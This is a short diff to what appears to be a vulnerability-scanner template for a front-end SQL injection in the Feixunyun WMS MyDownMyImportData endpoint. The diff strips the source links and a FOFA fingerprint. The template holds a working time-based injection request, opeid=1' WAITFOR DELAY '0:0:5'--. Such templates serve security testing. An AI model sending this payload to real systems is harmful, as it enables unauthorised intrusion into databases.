@@ -3,12 +3,8 @@ info:
   name: 飞讯云-WMS MyDownMyImportData 前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fnmn8e6siu2xx2wt'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fnmn8e6siu2xx2wt
-    fofa: body="wx8ccb75857bd3e985"
 http:
 - raw:
   - 'GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
